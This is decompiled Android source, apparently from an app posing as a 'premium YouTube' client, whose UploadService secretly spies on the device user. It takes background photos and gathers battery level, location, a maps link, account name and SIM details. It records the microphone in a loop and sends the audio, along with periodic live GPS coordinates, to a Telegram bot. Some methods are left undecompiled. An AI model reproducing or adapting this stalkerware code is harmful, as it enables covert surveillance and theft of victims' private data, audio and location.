        Intrinsics.checkNotNullExpressionValue(sbAppend6, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend6.append('\n'), "append('\\n')");
        StringBuilder sbAppend7 = new StringBuilder().append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۱String$0$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService());
        if (batteryPct >= LiveLiterals$UploadServiceKt.INSTANCE.m۲۱۶Int$$this$calltoFloat$arg1$callgreaterOrEqual$cond$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()) {
            StringBuilder sb2 = new StringBuilder();
            StringCompanionObject stringCompanionObject = StringCompanionObject.INSTANCE;
            String str3 = String.format(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۸String$arg0$callformat$$this$callplus$branch$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService(), Arrays.copyOf(new Object[]{Float.valueOf(batteryPct)}, 1));
            Intrinsics.checkNotNullExpressionValue(str3, "format(format, *args)");
            string = sb2.append(str3).append(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۴String$arg0$callplus$branch$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService()).toString();
        } else {
            string = LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۵String$else$if$1$str$arg0$callappendLine6$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService();
        }
        StringBuilder sbAppend8 = meta.append(sbAppend7.append(string).toString());
        Intrinsics.checkNotNullExpressionValue(sbAppend8, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend8.append('\n'), "append('\\n')");
        StringBuilder sbAppend9 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۳String$0$str$arg0$callappendLine7$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + orientationStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend9, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend9.append('\n'), "append('\\n')");
        StringBuilder sbAppend10 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۵String$0$str$arg0$callappendLine8$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + locationStr);
        Intrinsics.checkNotNullExpressionValue(sbAppend10, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend10.append('\n'), "append('\\n')");
        if (mapsUrl.length() > 0) {
            StringBuilder sbAppend11 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۷۵String$0$str$arg0$callappendLine$branch$if$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + mapsUrl);
            Intrinsics.checkNotNullExpressionValue(sbAppend11, "append(value)");
            Intrinsics.checkNotNullExpressionValue(sbAppend11.append('\n'), "append('\\n')");
        }
        StringBuilder sbAppend12 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۷String$0$str$arg0$callappendLine9$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + exposure3);
        Intrinsics.checkNotNullExpressionValue(sbAppend12, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend12.append('\n'), "append('\\n')");
        StringBuilder sbAppend13 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۳String$0$str$arg0$callappendLine10$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + iso2);
        Intrinsics.checkNotNullExpressionValue(sbAppend13, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend13.append('\n'), "append('\\n')");
        StringBuilder sbAppend14 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۵String$0$str$arg0$callappendLine11$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + userAccount4);
        Intrinsics.checkNotNullExpressionValue(sbAppend14, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend14.append('\n'), "append('\\n')");
        StringBuilder sbAppend15 = meta.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۸۷String$0$str$arg0$callappendLine12$fun$anonymous$$arg0$callsetOnImageAvailableListener$try$funtakeBackgroundPhoto$classUploadService() + simInfo4);
        Intrinsics.checkNotNullExpressionValue(sbAppend15, "append(value)");
        Intrinsics.checkNotNullExpressionValue(sbAppend15.append('\n'), "append('\\n')");
        BuildersKt.launch$default(this$0, (CoroutineContext) null, (CoroutineStart) null, new UploadService$takeBackgroundPhoto$2$1(this$0, file, meta, null), 3, (Object) null);
        $imageReader.close();
        $handlerThread.quitSafely();
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startBackgroundMicLoop$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startBackgroundMicLoop$1", f = "UploadService.kt", i = {}, l = {1311, 1315}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۱1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۵۱1(Continuation<? super C۰۰۵۱1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۱1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:15:0x002a A[Catch: Exception -> 0x001b, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x001b, blocks: (B:15:0x002a, B:8:0x0017), top: B:26:0x0017 }] */
        /* JADX WARN: Removed duplicated region for block: B:22:0x0067 A[RETURN] */
        /* JADX WARN: Removed duplicated region for block: B:24:0x0069  */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0065 -> B:13:0x0021). Please report as a decompilation issue!!! */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r7) {
            /*
                r6 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r6.label
                switch(r1) {
                    case 0: goto L1d;
                    case 1: goto L16;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                r7.<init>(r0)
                throw r7
            L11:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)
                goto L68
            L16:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)     // Catch: java.lang.Exception -> L1b
                goto L39
            L1b:
                r2 = move-exception
                goto L3a
            L1d:
                kotlin.ResultKt.throwOnFailure(r7)
                r1 = r6
            L21:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this
                boolean r2 = com.w8sb.w8premiumyt.UploadService.access$isUploading$p(r2)
                if (r2 == 0) goto L69
            L2a:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this     // Catch: java.lang.Exception -> L1b
                r3 = r1
                kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3     // Catch: java.lang.Exception -> L1b
                r4 = 1
                r1.label = r4     // Catch: java.lang.Exception -> L1b
                java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$recordAndSendMic(r2, r3)     // Catch: java.lang.Exception -> L1b
                if (r2 != r0) goto L39
                return r0
            L39:
                goto L4c
            L3a:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r3 = r3.m۸۳۲String$arg0$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundMicLoop$classUploadService()
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r4 = r4.m۱۳۱۰String$arg1$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundMicLoop$classUploadService()
                r5 = r2
                java.lang.Throwable r5 = (java.lang.Throwable) r5
                android.util.Log.e(r3, r4, r5)
            L4c:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this
                int r2 = com.w8sb.w8premiumyt.UploadService.access$getMicrophoneIntervalSec$p(r2)
                long r2 = (long) r2
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                long r4 = r4.m۳۴۱Long$arg0$calltimes$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$funstartBackgroundMicLoop$classUploadService()
                long r2 = r2 * r4
                r4 = r1
                kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                r5 = 2
                r1.label = r5
                java.lang.Object r2 = kotlinx.coroutines.DelayKt.delay(r2, r4)
                if (r2 != r0) goto L68
                return r0
            L68:
                goto L21
            L69:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۱1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    private final void startBackgroundMicLoop() {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۱1(null), 3, (Object) null);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Removed duplicated region for block: B:37:0x014f A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:38:0x0150  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /* JADX WARN: Type inference failed for: r2v0, types: [int] */
    /* JADX WARN: Type inference failed for: r2v1 */
    /* JADX WARN: Type inference failed for: r2v10 */
    /* JADX WARN: Type inference failed for: r2v12 */
    /* JADX WARN: Type inference failed for: r2v14 */
    /* JADX WARN: Type inference failed for: r2v17 */
    /* JADX WARN: Type inference failed for: r2v18, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r2v2, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r2v20, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r2v6, types: [java.io.File, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r4v11 */
    /* JADX WARN: Type inference failed for: r4v3 */
    /* JADX WARN: Type inference failed for: r4v4 */
    /* JADX WARN: Type inference failed for: r4v5 */
    /* JADX WARN: Type inference failed for: r4v6, types: [java.io.File, java.lang.Object] */
    /* JADX WARN: Type inference failed for: r4v8, types: [java.io.File] */
    /* JADX WARN: Type inference failed for: r5v1, types: [com.w8sb.w8premiumyt.UploadService] */
    /* JADX WARN: Type inference failed for: r5v6 */
    /* JADX WARN: Type inference failed for: r5v7 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object recordAndSendMic(kotlin.coroutines.Continuation<? super kotlin.Unit> r12) throws java.lang.Throwable {
        /*
            Method dump skipped, instruction units count: 386
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.recordAndSendMic(kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendAudioToTelegram(java.io.File r12, kotlin.coroutines.Continuation<? super kotlin.Unit> r13) {
        /*
            Method dump skipped, instruction units count: 254
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendAudioToTelegram(java.io.File, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendAudioToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendAudioToTelegram$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۲2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ MultipartBody $requestBody;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۲۲2(MultipartBody multipartBody, Continuation<? super C۰۰۲۲2> continuation) {
            super(2, continuation);
            this.$requestBody = multipartBody;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۲2(this.$requestBody, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۸String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendAudioToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۳String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendAudioToTelegram$classUploadService()).post(this.$requestBody).build()).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۱۹String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendAudioToTelegram$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۱String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendAudioToTelegram$classUploadService() + response2.code() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۱String$2$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendAudioToTelegram$classUploadService() + response2.message());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$startLiveLocationLoop$1, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$startLiveLocationLoop$1", f = "UploadService.kt", i = {}, l = {1382, 1386}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۵۳1 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۵۳1(Continuation<? super C۰۰۵۳1> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۵۳1(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        /* JADX WARN: Removed duplicated region for block: B:15:0x002a A[Catch: Exception -> 0x001b, TRY_ENTER, TRY_LEAVE, TryCatch #0 {Exception -> 0x001b, blocks: (B:15:0x002a, B:8:0x0017), top: B:26:0x0017 }] */
        /* JADX WARN: Removed duplicated region for block: B:22:0x0067 A[RETURN] */
        /* JADX WARN: Removed duplicated region for block: B:24:0x0069  */
        /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:21:0x0065 -> B:13:0x0021). Please report as a decompilation issue!!! */
        /*
            Code decompiled incorrectly, please refer to instructions dump.
            To view partially-correct add '--show-bad-code' argument
        */
        public final java.lang.Object invokeSuspend(java.lang.Object r7) {
            /*
                r6 = this;
                java.lang.Object r0 = kotlin.coroutines.intrinsics.IntrinsicsKt.getCOROUTINE_SUSPENDED()
                int r1 = r6.label
                switch(r1) {
                    case 0: goto L1d;
                    case 1: goto L16;
                    case 2: goto L11;
                    default: goto L9;
                }
            L9:
                java.lang.IllegalStateException r7 = new java.lang.IllegalStateException
                java.lang.String r0 = "call to 'resume' before 'invoke' with coroutine"
                r7.<init>(r0)
                throw r7
            L11:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)
                goto L68
            L16:
                r1 = r6
                kotlin.ResultKt.throwOnFailure(r7)     // Catch: java.lang.Exception -> L1b
                goto L39
            L1b:
                r2 = move-exception
                goto L3a
            L1d:
                kotlin.ResultKt.throwOnFailure(r7)
                r1 = r6
            L21:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this
                boolean r2 = com.w8sb.w8premiumyt.UploadService.access$isUploading$p(r2)
                if (r2 == 0) goto L69
            L2a:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this     // Catch: java.lang.Exception -> L1b
                r3 = r1
                kotlin.coroutines.Continuation r3 = (kotlin.coroutines.Continuation) r3     // Catch: java.lang.Exception -> L1b
                r4 = 1
                r1.label = r4     // Catch: java.lang.Exception -> L1b
                java.lang.Object r2 = com.w8sb.w8premiumyt.UploadService.access$sendLiveLocationToTelegram(r2, r3)     // Catch: java.lang.Exception -> L1b
                if (r2 != r0) goto L39
                return r0
            L39:
                goto L4c
            L3a:
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r3 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r3 = r3.m۸۳۳String$arg0$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartLiveLocationLoop$classUploadService()
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                java.lang.String r4 = r4.m۱۳۱۱String$arg1$calle$catch$body$loop$fun$anonymous$$arg2$calllaunch$funstartLiveLocationLoop$classUploadService()
                r5 = r2
                java.lang.Throwable r5 = (java.lang.Throwable) r5
                android.util.Log.e(r3, r4, r5)
            L4c:
                com.w8sb.w8premiumyt.UploadService r2 = com.w8sb.w8premiumyt.UploadService.this
                int r2 = com.w8sb.w8premiumyt.UploadService.access$getLiveLocationIntervalSec$p(r2)
                long r2 = (long) r2
                com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt r4 = com.w8sb.w8premiumyt.LiveLiterals$UploadServiceKt.INSTANCE
                long r4 = r4.m۳۴۲Long$arg0$calltimes$arg0$calldelay$body$loop$fun$anonymous$$arg2$calllaunch$funstartLiveLocationLoop$classUploadService()
                long r2 = r2 * r4
                r4 = r1
                kotlin.coroutines.Continuation r4 = (kotlin.coroutines.Continuation) r4
                r5 = 2
                r1.label = r5
                java.lang.Object r2 = kotlinx.coroutines.DelayKt.delay(r2, r4)
                if (r2 != r0) goto L68
                return r0
            L68:
                goto L21
            L69:
                kotlin.Unit r0 = kotlin.Unit.INSTANCE
                return r0
            */
            throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.C۰۰۵۳1.invokeSuspend(java.lang.Object):java.lang.Object");
        }
    }

    private final void startLiveLocationLoop() {
        BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۵۳1(null), 3, (Object) null);
    }

    private final Object sendLiveLocationToTelegram(Continuation<? super Unit> continuation) {
        Location l;
        if (ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_FINE_LOCATION") == 0 || ContextCompat.checkSelfPermission(this, "android.permission.ACCESS_COARSE_LOCATION") == 0) {
            Object systemService = getSystemService("location");
            Intrinsics.checkNotNull(systemService, "null cannot be cast to non-null type android.location.LocationManager");
            LocationManager lm = (LocationManager) systemService;
            List<String> providers = lm.getProviders(LiveLiterals$UploadServiceKt.INSTANCE.m۱۶۲Boolean$arg0$callgetProviders$valproviders$branch$if$funsendLiveLocationToTelegram$classUploadService());
            Intrinsics.checkNotNullExpressionValue(providers, "lm.getProviders(true)");
            Location loc = null;
            for (String provider : providers) {
                try {
                    l = lm.getLastKnownLocation(provider);
                } catch (Exception e) {
                    l = null;
                }
                if (l != null && (loc == null || l.getTime() > loc.getTime())) {
                    loc = l;
                }
            }
            if (loc == null) {
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۳3(null), 3, (Object) null);
            } else {
                double lat = loc.getLatitude();
                double lon = loc.getLongitude();
                String dateStr = new SimpleDateFormat(LiveLiterals$UploadServiceKt.INSTANCE.m۷۳۳String$arg0$call$init$$$this$callformat$valdateStr$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService()).format(new Date(loc.getTime()));
                String msg = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۷String$0$str$valmsg$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService() + dateStr + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۴String$2$str$valmsg$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService() + lat + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۲String$4$str$valmsg$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService() + lon + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۰String$6$str$valmsg$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService() + lat + LiveLiterals$UploadServiceKt.INSTANCE.m۷۲۶String$8$str$valmsg$branch$if$branch$if$funsendLiveLocationToTelegram$classUploadService() + lon;
                BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new C۰۰۳۲2(msg, null), 3, (Object) null);
            }
        } else {
            BuildersKt.launch$default(this, (CoroutineContext) null, (CoroutineStart) null, new AnonymousClass4(null), 3, (Object) null);
        }
        return Unit.INSTANCE;
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$2", f = "UploadService.kt", i = {}, l = {1406}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۲2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $msg;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۳۲2(String str, Continuation<? super C۰۰۳۲2> continuation) {
            super(2, continuation);
            this.$msg = str;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۲2(this.$msg, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(this.$msg, (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$3, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$3", f = "UploadService.kt", i = {}, l = {1408}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۳۳3 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        C۰۰۳۳3(Continuation<? super C۰۰۳۳3> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۳۳3(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۵۶String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$branch$if$funsendLiveLocationToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$4, reason: invalid class name */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendLiveLocationToTelegram$4", f = "UploadService.kt", i = {}, l = {1411}, m = "invokeSuspend", n = {}, s = {})
    static final class AnonymousClass4 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        int label;

        AnonymousClass4(Continuation<? super AnonymousClass4> continuation) {
            super(2, continuation);
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new AnonymousClass4(continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۱۰۶۲String$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$else$if$funsendLiveLocationToTelegram$classUploadService(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:12:0x0059  */
    /* JADX WARN: Removed duplicated region for block: B:15:0x005d A[Catch: Exception -> 0x007e, LOOP:0: B:4:0x001f->B:15:0x005d, LOOP_END, TryCatch #0 {Exception -> 0x007e, blocks: (B:3:0x0006, B:5:0x0021, B:9:0x0051, B:17:0x0061, B:19:0x0065, B:22:0x0078, B:15:0x005d), top: B:27:0x0006 }] */
    /* JADX WARN: Removed duplicated region for block: B:30:0x005c A[SYNTHETIC] */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
